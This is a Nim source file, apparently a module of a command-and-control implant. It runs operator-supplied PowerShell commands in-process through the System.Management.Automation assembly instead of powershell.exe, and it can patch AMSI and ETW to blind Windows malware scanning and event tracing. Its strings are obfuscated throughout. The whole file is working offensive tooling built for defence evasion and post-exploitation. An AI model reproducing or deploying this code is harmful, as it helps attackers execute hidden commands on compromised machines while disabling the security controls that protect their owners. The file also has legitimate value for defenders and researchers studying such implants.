import winim/clr except `[]`
from strutils import parseInt, join
import ../../selfProtections/patches/[patchAMSI, patchETW]
import ../../util/strenc

# Execute a PowerShell command through referencing the System.Management.Automation
# assembly DLL directly without calling powershell.exe
proc powershell*(args : seq[string]) : string =
    # This shouldn't happen since parameters are managed on the Python-side, but you never know
    if not args.len >= 2:
        result = obf("Invalid number of arguments received. Usage: 'powershell <BYPASSAMSI=0> <BLOCKETW=0> [command]'.")
        return

    var
        amsi: bool = false
        etw: bool = false
        commandArgs = args[2 .. ^1].join(obf(" "))

    amsi = cast[bool](parseInt(args[0]))
    etw = cast[bool](parseInt(args[1]))

    result = obf("Executing command through unmanaged PowerShell...\n")
    if amsi:
        var res = patchAMSI.patchAMSI()
        if res == 0:
            result.add(obf("[+] AMSI patched!\n"))
        if res == 1:
            result.add(obf("[-] Error patching AMSI!\n"))
        if res == 2:
            result.add(obf("[+] AMSI already patched!\n"))
    if etw:
        var res = patchETW.patchETW()
        if res == 0:
            result.add(obf("[+] ETW patched!\n"))
        if res == 1:
            result.add(obf("[-] Error patching ETW!\n"))
        if res == 2:
            result.add(obf("[+] ETW already patched!\n"))
    
    try:
        # Load PowerShell assembly
        let Automation = load("System.Management.Automation")
        let RunspaceFactory = Automation.GetType("System.Management.Automation.Runspaces.RunspaceFactory")
        
        # Create runspace and pipeline
        var runspace = @RunspaceFactory.CreateRunspace()
        var pipeline = runspace.CreatePipeline()
        
        # Set up output capture
        let mscorlib = load("mscorlib")
        let consoleType = mscorlib.GetType("System.Console")
        let stringBuilderType = mscorlib.GetType("System.Text.StringBuilder")
        let stringWriterType = mscorlib.GetType("System.IO.StringWriter")
        
        # Create objects for the capture
        let sb = mscorlib.new("System.Text.StringBuilder")
        let sw = mscorlib.new("System.IO.StringWriter", sb)
        
        # Save original outputs
        let oldOut = @consoleType.Out
        let oldErr = @consoleType.Error
        
        try:
            # Redirect standard output and error
            @consoleType.SetOut(sw)
            @consoleType.SetError(sw)
            
            # Execute PowerShell command
            runspace.Open()
            pipeline.Commands.AddScript(commandArgs)
            
            var pipeOut = pipeline.Invoke()
            
            # Process output
            if pipeOut.Count() > 0:
                result.add(obf("\n[+] PowerShell Output:\n"))
                result.add("==================================================\n")
                for i in countUp(0, pipeOut.Count() - 1):
                    let item = $pipeOut.Item(i)
                    if item != "":
                        result.add(item & "\n")
                result.add("==================================================\n")
            
            result.add(obf("[+] PowerShell command executed successfully.\n"))
            
        finally:
            # Restore original outputs
            @consoleType.SetOut(oldOut)
            @consoleType.SetError(oldErr)
            
            # Clean up
            runspace.Dispose()
            pipeline.Dispose()
            
    except Exception as e:
        result.add(obf("[-] Error executing PowerShell: ") & getCurrentExceptionMsg() & "\n")